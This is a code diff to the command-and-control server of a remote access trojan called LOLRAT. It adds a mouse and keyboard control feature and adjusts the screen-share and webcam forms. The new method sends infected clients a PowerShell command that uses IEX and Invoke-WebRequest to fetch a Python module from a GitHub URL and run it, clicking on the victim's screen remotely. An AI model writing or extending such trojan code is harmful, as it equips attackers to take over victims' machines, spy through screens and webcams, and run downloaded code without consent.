@@ -182,8 +182,8 @@ namespace LOLRAT_C2
 
                 // Start the SS form
                 txtOutput.AppendText("Starting image sharing form...\r\n");
-                SS ss = new SS();
-                ss.Show();
+                SS ssForm = new SS(this);
+                ssForm.Show();
 
                 // Send the SS command to selected client
                 txtOutput.AppendText("Sending SS command to client...\r\n");
@@ -204,6 +204,43 @@ namespace LOLRAT_C2
 
         // ---------------------------------------------------------------------------
         //
+        //                        Mouse and keyboard control
+        //
+        // ---------------------------------------------------------------------------
+        public void ExecuteMouseClick(int X, int Y, string Type)
+        {
+            // Execute a mouse click on the current client
+            if (dgvClients.SelectedRows.Count > 0)
+            {
+                DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
+                string clientIP = selectedRow.Cells["IP"].Value.ToString();
+                int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
+                ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
+
+                if (selectedClient != null)
+                {
+                    //byte[] data = Encoding.ASCII.GetBytes($"exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ControlMouse.py\").Content {X} {Y} {Type}'\"");
+                    //selectedClient.Stream.Write(data, 0, data.Length);
+                    txtCommand.Text = $"exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ControlMouse.py\").Content {X} {Y} {Type}'\"";
+                    // Press the btnSend button
+                    btnSend.PerformClick();
+                    txtOutput.AppendText($"Sent {Type}-click to client at X: {X}, Y: {Y}!\r\n");
+                }
+                else
+                {
+                    MessageBox.Show("Selected client is null. Check FindClientByIPAndPort implementation.");
+                }
+            }
+            else
+            {
+                MessageBox.Show("No rows selected in the DataGridView.");
+            }
+        }
+
+
+
+        // ---------------------------------------------------------------------------
+        //
         //                              Photo with Webcam
         //
         // ---------------------------------------------------------------------------
@@ -215,8 +252,8 @@ namespace LOLRAT_C2
 
             // Start the SS form
             txtOutput.AppendText("Starting image sharing form...\r\n");
-            SS ss = new SS();
-            ss.Show();
+            SS ssForm = new SS(this);
+            ssForm.Show();
 
             // Send the SS command to selected client
             txtOutput.AppendText("Sending Webcam command to client...\r\n");
